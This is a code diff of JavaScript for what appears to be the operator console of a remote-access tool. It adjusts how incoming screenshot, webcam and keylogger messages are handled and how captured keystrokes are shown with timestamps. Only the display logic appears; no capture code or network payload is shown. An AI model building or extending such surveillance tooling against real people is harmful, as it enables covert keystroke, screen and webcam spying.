@@ -182,10 +182,11 @@ function onWSMessage(event) {
 }
 
 function HandleClientMSG(data) {
+    console.log(data);
     if (data == "screenshot") { flag = 1; return; }
     if (data == "webcam") { flag = 2; return; }
-    if (data == "Keylogging started") { flag = 3; logKeyToConsole(">>> [SYSTEM] Keylogger Started"); return; }
-    if (data == "Keylogging stopped") { flag = 4; logKeyToConsole(">>> [SYSTEM] Keylogger Stopped"); return; }
+    if (data == "Keylogging started.") { flag = 3; logKeyToConsole(">>> [SYSTEM] Keylogger Started"); return; }
+    if (data == "Keylogging stopped.") { flag = 4; logKeyToConsole(">>> [SYSTEM] Keylogger Stopped"); return; }
     if (data === "Keylog") {
         flag = 7;
         console.log("WTF");
@@ -353,14 +354,7 @@ function logKeyToConsole(msg) {
     const consoleBox = document.getElementById("keylogConsole");
 
     // Nếu chưa có dòng hiện tại hoặc gặp phím ENTER, tạo một dòng mới
-    if (!currentLogLine || msg.includes("[ENTER]")) {
-        // Nếu là phím ENTER, ta vẫn thêm text vào dòng cũ trước khi kết thúc dòng đó
-        if (currentLogLine && msg.includes("[ENTER]")) {
-            currentLogLine.innerHTML += ` <span style="color: #00ff88">${msg}</span>`;
-            currentLogLine = null; // Reset để phím tiếp theo sẽ vào dòng mới
-            return;
-        }
-
+    if (!currentLogLine) {
         // Tạo dòng mới (div)
         const div = document.createElement("div");
         div.className = "console-line";
@@ -377,6 +371,34 @@ function logKeyToConsole(msg) {
     if (currentLogLine) {
         // Tạo span để bọc ký tự cho đẹp (tùy chọn)
         const keySpan = document.createElement("span");
+        if (currentLogLine.textContent.includes(">>> [SYSTEM] Keylogger Started")) {
+            // Tạo dòng mới (div)
+            const div = document.createElement("div");
+            div.className = "console-line";
+
+            // Thêm timestamp cho dòng mới
+            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+            div.innerHTML = `<span style="color: #555">[${time}]</span> `;
+
+            consoleBox.appendChild(div);
+            currentLogLine = div; // Gán dòng này là dòng hiện tại để các key sau nối vào
+        }
+        if (msg.includes(">>> [SYSTEM] Keylogger Stopped")) {
+            // Tạo dòng mới (div)
+            const div = document.createElement("div");
+            div.className = "console-line";
+
+            // Thêm timestamp cho dòng mới
+            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+            div.innerHTML = `<span style="color: #555">[${time}]</span> `;
+
+            consoleBox.appendChild(div);
+            currentLogLine = div; // Gán dòng này là dòng hiện tại để các key sau nối vào
+            keySpan.innerText = msg;
+            currentLogLine.appendChild(keySpan);
+            currentLogLine = null; // Reset dòng hiện tại
+            return;
+        }
 
         // Nếu là các phím chức năng (nằm trong ngoặc vuông []), cho màu khác
         if (msg.startsWith("[") && msg.endsWith("]")) {
